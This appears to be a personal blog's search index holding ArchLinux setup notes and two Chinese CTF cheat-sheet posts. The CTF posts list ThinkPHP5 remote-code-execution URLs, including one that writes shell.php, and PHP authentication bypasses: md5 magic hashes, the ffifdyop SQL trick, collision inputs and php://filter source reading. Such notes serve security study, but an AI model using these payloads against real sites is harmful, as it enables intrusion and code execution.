<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ArchLinux下奇怪小问题的解决</title>
    <url>/2020/10/18/ArchLinux%E4%B8%8B%E5%A5%87%E6%80%AA%E5%B0%8F%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<p>ArchLinux 配合KDE Plasma作为一个桌面系统来使用，相当好用。不过也有一些痛点和痒点需要自己踩坑。把踩坑过程放在这里整理一下。持续更新(<del>大概</del>)</p>
<a id="more"></a>

<h2 id="Plasma-discover-无法联网"><a href="#Plasma-discover-无法联网" class="headerlink" title="Plasma-discover 无法联网"></a>Plasma-discover 无法联网</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>装了个比较纯净的Arch系统，没有安装kde-applications包组，发现plasma-discover无法联网，显示<code>Unable to load applications. Please verify Internet connectivity</code>。</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>问题的产生是由于缺少kde-application包组里的一些包。不过这个包组实在臃肿，我不愿意装它。所以去定位造成问题的包了。最后发现造成问题的包是 <code>packagekit-qt5</code> 和 <code>appstream</code> 这两个。所以：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S packagekit-qt5 appstream</span><br></pre></td></tr></table></figure>

<p>问题解决。</p>
<h2 id="双系统情况下Windows磁盘无法自动挂载"><a href="#双系统情况下Windows磁盘无法自动挂载" class="headerlink" title="双系统情况下Windows磁盘无法自动挂载"></a>双系统情况下Windows磁盘无法自动挂载</h2><h3 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h3><p>我使用了Arch和Win10的双系统。每次需要访问Win10硬盘分区中的内容都要手动重新挂载而且需要用户密码。懒狗觉得这样不行，必须把这个问题解决了才能叫做懒狗。</p>
<h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><p>首先解决每次都需要手动挂载的问题。我先让它来个自动挂载。先查看一下分区看看自己需要挂载哪些内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>

<p>我需要挂载的是两个分区，一个是 <code>/dev/nvme0n1p3</code> （C盘），一个是 <code>/dev/nvme0n1p5</code> （D盘）。所以编辑一下fstab的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/fstab</span><br></pre></td></tr></table></figure>

<p>在文件的最后加上这样几句：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta"># /dev/nvme0n1p3</span></span><br><span class="line"><span class="meta-keyword">/dev/</span>nvme0n1p3          <span class="meta-keyword">/run/</span>media<span class="meta-keyword">/muted/</span>Windows/  ntfs        rw,relatime     <span class="number">0</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># /dev/nvme0n1p5</span></span><br><span class="line"><span class="meta-keyword">/dev/</span>nvme0n1p5          <span class="meta-keyword">/run/</span>media<span class="meta-keyword">/muted/</span>DATA/      ntfs        rw,relatime     <span class="number">0</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>当然，具体情况具体分析，<del>意思就是你照抄上面这份估计一般不得行（</del></p>
<p>接下来解决需要输入密码的问题。STFW之后发现这个密码的配置在 <code>/usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy  </code> 这里。备份一下：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sudo cp /usr/share/polkit-<span class="number">1</span>/actions/org<span class="selector-class">.freedesktop</span><span class="selector-class">.UDisks2</span><span class="selector-class">.policy</span> org<span class="selector-class">.freedesktop</span><span class="selector-class">.UDisks2</span><span class="selector-class">.policy</span>.bak</span><br></pre></td></tr></table></figure>

<p>改一下文件里 <code>&lt;action id=&quot;org.freedesktop.udisks2.filesystem-mount-system&quot;&gt;</code> 的相关配置，把 <code>&lt;allow_active&gt;</code> 标签里的 <code>auth_admin_keep</code> 改成 <code>yes</code> 。我的是在173行，当然这也需要具体情况具体分析了。</p>
<p>重启一下，发现这两块分区自动挂载到了/run/media/下面。成了！</p>
]]></content>
      <categories>
        <category>系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF中琐碎的姿势们</title>
    <url>/2020/06/16/CTF%E4%B8%AD%E7%90%90%E7%A2%8E%E7%9A%84%E5%A7%BF%E5%8A%BF%E4%BB%AC/</url>
    <content><![CDATA[<p>记录CTF中的一些琐碎杂项备忘，方便查找。</p>
<a id="more"></a>

<h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><h3 id="HTML中的特殊转义字符"><a href="#HTML中的特殊转义字符" class="headerlink" title="HTML中的特殊转义字符"></a>HTML中的特殊转义字符</h3><table>
<thead>
<tr>
<th>字符</th>
<th>十进制</th>
<th>转义字符</th>
</tr>
</thead>
<tbody><tr>
<td>“</td>
<td><code>&amp;#34;</code></td>
<td><code>&amp;quot;</code></td>
</tr>
<tr>
<td>&amp;</td>
<td><code>&amp;#38;</code></td>
<td><code>&amp;amp;</code></td>
</tr>
<tr>
<td>&lt;</td>
<td><code>&amp;#60;</code></td>
<td><code>&amp;lt;</code></td>
</tr>
<tr>
<td>&gt;</td>
<td><code>&amp;#62;</code></td>
<td><code>&amp;gt;</code></td>
</tr>
<tr>
<td>不断开空格(non-breaking space)</td>
<td><code>&amp;#160;</code></td>
<td><code>&amp;nbsp;</code></td>
</tr>
<tr>
<td>|</td>
<td><code>&amp;#166;</code></td>
<td><code>&amp;brvbar;</code></td>
</tr>
</tbody></table>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><h3 id="swp-swo-…-文件"><a href="#swp-swo-…-文件" class="headerlink" title=".swp/.swo/… 文件"></a>.swp/.swo/… 文件</h3><p>这些文件是vim创建的临时文件。一个文件在vim中打开之后会创建 .swp 文件。如果 .swp 文件已存在，则创建 .swo 文件，若 .swo 文件存在则创建 .swn 文件，以此类推。vim 关闭时这些文件将自动被删除，若vim崩溃或被杀死，则保留。有时可用作 CTF 中源码的来源。</p>
<p>例如：一个叫 <code>abc.php</code> 的文件会产生一个名为 <code>.abc.php.swp</code> 的临时文件。注意文件最前面有一个小点。</p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="PHP基础"><a href="#PHP基础" class="headerlink" title="PHP基础"></a>PHP基础</h3><h4 id="gt-gt-的区别"><a href="#gt-gt-的区别" class="headerlink" title="-&gt; , =&gt; , :: 的区别"></a>-&gt; , =&gt; , :: 的区别</h4><p><code>-&gt;</code> 是插入式解引用的符号，用法与C语言相似。<code>=&gt;</code> 在数组中常常出现，用来连接键值对。<code>::</code> 与C语言中的 <code>.</code> 类似，用于调用类的内部成员，或类之间的相互调用。</p>
<h3 id="phps"><a href="#phps" class="headerlink" title=".phps"></a>.phps</h3><p>服务器遇php文件会解析。此时若想要读源码要使用phps文件。源码泄露的来源。</p>
<h3 id="thinkphp5-RCE"><a href="#thinkphp5-RCE" class="headerlink" title="thinkphp5 RCE"></a>thinkphp5 RCE</h3><p>5.1.x php版本&gt;5.5</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=index/think\request/input?data[]=phpinfo()&amp;filter=assert</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/index.php?s=index/think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=assert&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=phpinfo()</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&amp;content=<span class="xml"><span class="php"><span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();<span class="meta">?&gt;</span></span></span></span><br></pre></td></tr></table></figure>

<p>5.0.x php版本&gt;=5.4</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=index/\think\Container/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=phpinfo&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=1</span><br></pre></td></tr></table></figure>

<p>还可参见<a href="https://y4er.com/post/thinkphp5-rce/#5020" target="_blank" rel="noopener"><strong>Thinkphp</strong>5 RCE总结 – Y4er的博客</a>。</p>
<h2 id="配置错误"><a href="#配置错误" class="headerlink" title="配置错误"></a>配置错误</h2><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><h4 id="常见的网站源码备份文件后缀"><a href="#常见的网站源码备份文件后缀" class="headerlink" title="常见的网站源码备份文件后缀"></a>常见的网站源码备份文件后缀</h4><ul>
<li>tar</li>
<li>tar.gz</li>
<li>zip</li>
<li>rar</li>
</ul>
<h4 id="常见的网站源码备份文件名"><a href="#常见的网站源码备份文件名" class="headerlink" title="常见的网站源码备份文件名"></a>常见的网站源码备份文件名</h4><ul>
<li>web</li>
<li>website</li>
<li>backup</li>
<li>back</li>
<li>www</li>
<li>wwwroot</li>
<li>temp</li>
</ul>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP相关姿势</title>
    <url>/2020/06/16/PHP%E7%9B%B8%E5%85%B3%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<p>整理 CTF 中 PHP 相关的利用姿势，不定期补充。</p>
<a id="more"></a>

<h2 id="弱类型相关姿势"><a href="#弱类型相关姿势" class="headerlink" title="弱类型相关姿势"></a>弱类型相关姿势</h2><p>弱类型的语言对变量的数据类型没有限制，你可以在任何地时候将变量赋值给任意的其他类型的变量，同时变量也可以转换成任意地其他类型的数据。</p>
<h3 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h3><h4 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h4><p>弱等的比较中不需左右两边的类型相等，会经过转换变成相同的类型后比较，由此产生安全问题。如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="keyword">NULL</span>;$b=<span class="keyword">FALSE</span>;  <span class="comment">//$a==$b</span></span><br><span class="line">$a=<span class="string">''</span>;$b=<span class="keyword">NULL</span>;  <span class="comment">//$a==$b</span></span><br></pre></td></tr></table></figure>

<p>还有，bool类型的true跟任意字符串可以弱类型相等。</p>
<p>以及类型转换的一些规则，如字符串转数字会从不满足转换规则的位置开始截断只取最前边的数字部分而不会报错等。（ 注：数字到字符串可以用strval()，字符串和数字可以用intval() ）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> == <span class="string">'0'</span>		<span class="comment">//true</span></span><br><span class="line"><span class="number">0</span> == <span class="string">'abcdefg'</span>	<span class="comment">//true</span></span><br><span class="line"><span class="number">0</span> === <span class="string">'abcdefg'</span>	<span class="comment">//false</span></span><br><span class="line"><span class="number">1</span> == <span class="string">'1abcdef'</span>	<span class="comment">//true</span></span><br><span class="line"><span class="string">"0e123456"</span>==<span class="string">"0e4456789"</span>   <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<h4 id="哈希比较"><a href="#哈希比较" class="headerlink" title="哈希比较"></a>哈希比较</h4><h5 id="md5-弱等的绕过"><a href="#md5-弱等的绕过" class="headerlink" title="md5 弱等的绕过"></a>md5 弱等的绕过</h5><p>md5(‘240610708’) == md5(‘QNKCDZO’) (0exxxxxxx)</p>
<p>在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中2个数的值都是0因而就相等了。如果不满足0e\d+这种模式就不会相等。</p>
<p>0e\d+ 的字符串整理：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br></pre></td></tr></table></figure>



<p>强等的绕过方法放在后文的 内置函数的参数松散性 一节中。</p>
<h5 id="绕过-md5-函数注入-MySQL"><a href="#绕过-md5-函数注入-MySQL" class="headerlink" title="绕过 md5()函数注入 MySQL"></a>绕过 md5()函数注入 MySQL</h5><p><code>ffifdyop</code> 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6（<code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code>），而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 <code>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</code></p>
<p>等价于 or 一个永真式，因此相当于万能密码，可以绕过 md5()函数。</p>
<p>或者 129581926211651571912466741651878684928，<br>md5 值为 <code>\x06\xdaT0D\x9f\x8fo#\xdf\xc1&#39;or&#39;8</code> 也可行。</p>
<h4 id="十六进制转换"><a href="#十六进制转换" class="headerlink" title="十六进制转换"></a>十六进制转换</h4><p>还存在一种十六进制余字符串进行比较运算时的问题。例子如下：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="string">"0x1e240"</span>==<span class="string">"123456"</span>		<span class="comment">//true</span></span><br><span class="line"><span class="string">"0x1e240"</span>==<span class="number">123456</span>		<span class="comment">//true</span></span><br><span class="line"><span class="string">"0x1e240"</span>==<span class="string">"1e240"</span>		<span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>当其中的一个字符串是0x开头的时候，PHP会将此字符串解析成为十进制然后再进行比较，0x1e240解析成为十进制就是123456，所以与 int 类型和 string 类型的 123456 比较都是相等。攻防平台中的<strong>起名字真难</strong>就是考察的这个特性。</p>
<h4 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    $message = json_decode($_POST[<span class="string">'message'</span>]);</span><br><span class="line">    $key =<span class="string">"*********"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($message-&gt;key ==$key ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于$key的值，但$key的值我们不知道,这时我们构造一个和任意字符串返回为真的数组{“key”:true}。即可绕过。</p>
<p>payload: message={“key”,true}</p>
<h3 id="内置函数的参数松散性"><a href="#内置函数的参数松散性" class="headerlink" title="内置函数的参数松散性"></a>内置函数的参数松散性</h3><h4 id="md5-强等的绕过"><a href="#md5-强等的绕过" class="headerlink" title="md5()  强等的绕过"></a>md5()  强等的绕过</h4><p>md5()中的需要是一个string类型的参数。如果md5 函数的参数是一个数组值，会导致函数返回 false。除了 md5 之外 sha1 函数也有这个特性。 例如传入为 <code>?a[]=1&amp;b[]=2</code></p>
<p> 或者找到 md5 值相等的二进制数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br><span class="line">b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h4><p>strcmp()函数在PHP官方手册中的描述是<code>int strcmp ( string $str1 , string $str2 )</code>,需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。<br>如果传入给出strcmp()的参数是其它类型，可能产生其它不希望的结果。如：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">$<span class="built_in">array</span>=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">var_dump(strcmp($<span class="built_in">array</span>,<span class="string">'123'</span>)); <span class="comment">//null,在某种意义上null也就是相当于false，。</span></span><br></pre></td></tr></table></figure>

<h4 id="switch"><a href="#switch" class="headerlink" title="switch()"></a>switch()</h4><p>如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$i =<span class="string">"2abc"</span>;</span><br><span class="line"><span class="keyword">switch</span> ($i) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"i is less than 3 but not negative"</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"i is 3"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个时候程序输出的是<code>i is less than 3 but not negative</code>，是由于switch()函数将$i进行了类型转换，转换结果为2。</p>
<h4 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h4><p>在PHP手册中，in_array()函数的解释是<code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code>,如果strict参数没有提供，那么in_array就会使用松散比较来判断$needle是否在$haystack中。当strince的值为true时，needls的类型和haystack中的类型会被严格比较。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">$<span class="built_in">array</span>=<span class="literal">[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,'<span class="number">3</span>']</span>;</span><br><span class="line">var<span class="constructor">_dump(<span class="params">in_array</span>('<span class="params">abc</span>', $<span class="params">array</span>)</span>);  <span class="comment">//true</span></span><br><span class="line">var<span class="constructor">_dump(<span class="params">in_array</span>('1bc', $<span class="params">array</span>)</span>);	<span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>array_search()与in_array()也有一样的问题。</p>
<h2 id="PHP-Filter-相关姿势"><a href="#PHP-Filter-相关姿势" class="headerlink" title="PHP Filter 相关姿势"></a>PHP Filter 相关姿势</h2><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Re:0 Install Archlinux From Scratch</title>
    <url>/2020/10/17/Re-0-Install-Archlinux-From-Scratch/</url>
    <content><![CDATA[<p>前几天手贱把自己原来的Manjaro系统搞炸了，于是趁这个机会重装了自己一直心心念念的Arch，也算是从零开始的Arch生活了吧。因为这篇博客是在装系统的过程中写的，当时还没有配置中文的输入法，所以用了英文来写。英文水平有限肯定会出一些错误，还请海涵。<del>自己再装的时候能看懂就行</del></p>
<a id="more"></a>

<h2 id="Prepare-an-installation-medium"><a href="#Prepare-an-installation-medium" class="headerlink" title="Prepare an installation medium"></a>Prepare an installation medium</h2><p>I used rufus on Windows 10 to make my U-disk an installation medium. I chose dd mode of rufus. Make sure there is an empty partition on your disk.</p>
<p>I will go straight to the next step because this is easy.</p>
<h2 id="Pre-Installation"><a href="#Pre-Installation" class="headerlink" title="Pre-Installation"></a>Pre-Installation</h2><h3 id="Boot-the-live-environment"><a href="#Boot-the-live-environment" class="headerlink" title="Boot the live environment"></a>Boot the live environment</h3><p>Disable secure boot. Then restart your PC and boot from your USB device. Choose <code>Boot Arch Linux (x86_64)</code> , now you can see Archlinux is ready to load contents. Finally you will logged in on the first virtual console as the root user, and presented with a <code>zsh</code> shell prompt. You can autocomplete your commands using <code>tab</code> , OHHHHHH!</p>
<h3 id="Verify-the-boot-mode"><a href="#Verify-the-boot-mode" class="headerlink" title="Verify the boot mode"></a>Verify the boot mode</h3><p>To verify the boot mode, list the efivars directory:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /sys/firmware/efi/efivars</span><br></pre></td></tr></table></figure>

<p>If the command shows the directory without error, then the system is booted in UEFI mode. If the directory does not exist, the system may be booted in BIOS (or CSM) mode. If the system did not boot in the mode you desired, refer to your motherboard’s manual.</p>
<p>Or, a more secure way is <code>fdisk -l</code> ,if your SSD (or HDD) shows its <code>Disklabel type</code> is <code>gpt</code> and there is a small partition whose type is <code>EFI System</code> , Then your boot mode can be verified to be EFI.</p>
<h3 id="Connect-to-the-Internet"><a href="#Connect-to-the-Internet" class="headerlink" title="Connect to the Internet"></a>Connect to the Internet</h3><p>Arch needs network connection to complete its installation.</p>
<p>Ensure your network interface is listed and enabled:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip link</span><br></pre></td></tr></table></figure>

<p>For wired connection:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dhcpcd</span><br></pre></td></tr></table></figure>

<p>For wireless connection:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iwctl</span><br><span class="line">device list</span><br><span class="line">station wlan0 scan</span><br><span class="line">station wlan0 get-networks</span><br><span class="line">station wlan0 connect `xxxxx`</span><br></pre></td></tr></table></figure>

<p>Check if you are connected to the internet:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping baidu.com</span><br></pre></td></tr></table></figure>

<p>If everything is OK, quit iwd:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">quit</span><br></pre></td></tr></table></figure>

<h3 id="Update-the-system-clock"><a href="#Update-the-system-clock" class="headerlink" title="Update the system clock"></a>Update the system clock</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">timedatectl <span class="built_in">set</span>-ntp <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>To check the service status, use <code>timedatectl status</code>.</p>
<h3 id="Partition-the-disks"><a href="#Partition-the-disks" class="headerlink" title="Partition the disks"></a>Partition the disks</h3><table>
<thead>
<tr>
<th>Device Type</th>
<th>File Name</th>
</tr>
</thead>
<tbody><tr>
<td>SATA/SAS/USB</td>
<td>/dev/sda,/dev/sdb,……</td>
</tr>
<tr>
<td>IDE</td>
<td>/dev/hd0,/dev/hd1,……</td>
</tr>
<tr>
<td>VIRTIO-BLOCK</td>
<td>/dev/vda,/dev/vdb,……</td>
</tr>
<tr>
<td>M2(SSD)</td>
<td>/dev/nvme0,/dev/nvme1</td>
</tr>
<tr>
<td>SD/MMC/EMMC(Card)</td>
<td>/dev/mmcblk0,/dev/mmcblk1</td>
</tr>
<tr>
<td>CD drive</td>
<td>/dev/cdrom,/dev/sr0,/dev/sr1</td>
</tr>
</tbody></table>
<p>When recognized by the live system, disks are assigned to a <a href="https://wiki.archlinux.org/index.php/Block_device" target="_blank" rel="noopener">block device</a> such as <code>/dev/sda</code>, <code>/dev/nvme0n1</code> or <code>/dev/mmcblk0</code>. To identify these devices, use <code>lsblk</code> or <code>fdisk</code>.</p>
<p>I boot my Arch in UEFI mode, so first I must create a boot partition (EFI system partition). </p>
<h4 id="Create-a-boot-partition"><a href="#Create-a-boot-partition" class="headerlink" title="Create a boot partition"></a>Create a boot partition</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk /dev/&#123;YOUR DISK&#125;  <span class="comment"># Example: fdisk /dev/sdx  or  fdisk /dev/nvmex</span></span><br></pre></td></tr></table></figure>

<p>See usages of commands by typing <code>m</code> and enter.</p>
<p>Enter <code>n</code> to create a new partition. You are asked to select the starting sector, generally we type enter (select by default). Then enter end sector or partition size. I used <code>+512M</code> .</p>
<p>Enter <code>p</code> to check if it works. Enter <code>t</code> to change the type of your new partition. Enter <code>l</code> to see all types supported. Change it to EFI.</p>
<p>Enter <code>w</code> to save. You can check whether there is something wrong before that by <code>p</code>.</p>
<p>Format it:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs.fat -F32 /dev/&#123;YOUR BOOT PARTITION&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Root-partition"><a href="#Root-partition" class="headerlink" title="Root partition"></a>Root partition</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk /dev/&#123;YOUR DISK&#125;</span><br></pre></td></tr></table></figure>

<p>Create a new partition table if there is not one exist. I already have one on my disk so I go on directly.</p>
<p>Enter <code>n</code> to create a new partition. I want my new partition fill up the free space completely, so I use enter to choose the default.</p>
<p>Enter <code>p</code> then <code>w</code> just like creating your boot partition.</p>
<p>Format it:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs.ext4 /dev/P&#123;YOUR ROOT PARTITION&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Mount-the-file-systems"><a href="#Mount-the-file-systems" class="headerlink" title="Mount the file systems"></a>Mount the file systems</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/&#123;YOUR ROOT PARTITION&#125; /mnt</span><br><span class="line">mkdir /mnt/boot</span><br><span class="line">mount /dev/&#123;YOUR BOOT PARTITION&#125; /mnt/boot</span><br></pre></td></tr></table></figure>

<h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><h3 id="Use-Pacman-Mirror"><a href="#Use-Pacman-Mirror" class="headerlink" title="Use Pacman Mirror"></a>Use Pacman Mirror</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure>

<p>Copy the mirrors you wants to use and paste them to the beginning of this file. One of the commonly used mirrors is <code>https://mirrors.tuna.tsinghua.edu.cn</code>.</p>
<p>I chose <code>https://linux.xidian.edu.cn/mirrors/archlinux/$repo/os/$arch</code> (Only available under the campus network environment).</p>
<h3 id="Install-essential-packages"><a href="#Install-essential-packages" class="headerlink" title="Install essential packages"></a>Install essential packages</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacstrap /mnt base base-devel linux linux-firmware dhcpcd</span><br></pre></td></tr></table></figure>

<h2 id="Configure-the-system"><a href="#Configure-the-system" class="headerlink" title="Configure the system"></a>Configure the system</h2><h3 id="Fstab"><a href="#Fstab" class="headerlink" title="Fstab"></a>Fstab</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">genfstab -L /mnt &gt;&gt; /mnt/etc/fstab</span><br></pre></td></tr></table></figure>

<p>We need a check to make sure it is right since it is an important step. Check the resulting <code>/mnt/etc/fstab</code> file, and edit it in case of errors:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /mnt/etc/fstab</span><br></pre></td></tr></table></figure>

<h3 id="Chroot"><a href="#Chroot" class="headerlink" title="Chroot"></a>Chroot</h3><p><code>chroot</code> means ‘change root’. Change root into the new system:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arch-chroot /mnt</span><br></pre></td></tr></table></figure>

<p>We can also use this command to fix our system if there is some problem with it.</p>
<h3 id="Time-zone"><a href="#Time-zone" class="headerlink" title="Time zone"></a>Time zone</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure>

<h3 id="Install-necessary-packages"><a href="#Install-necessary-packages" class="headerlink" title="Install necessary packages"></a>Install necessary packages</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S vim dialog wpa_supplicant ntfs-3g networkmanager netctl</span><br></pre></td></tr></table></figure>

<h3 id="Localization"><a href="#Localization" class="headerlink" title="Localization"></a>Localization</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/locale.gen</span><br></pre></td></tr></table></figure>

<p>Uncomment <code>zh_CN.UTF-8 UTF-8</code> <code>zh_HK.UTF-8 UTF-8</code> <code>zh_TW.UTF-8 UTF-8</code> <code>en_US.UTF-8 UTF-8</code> .</p>
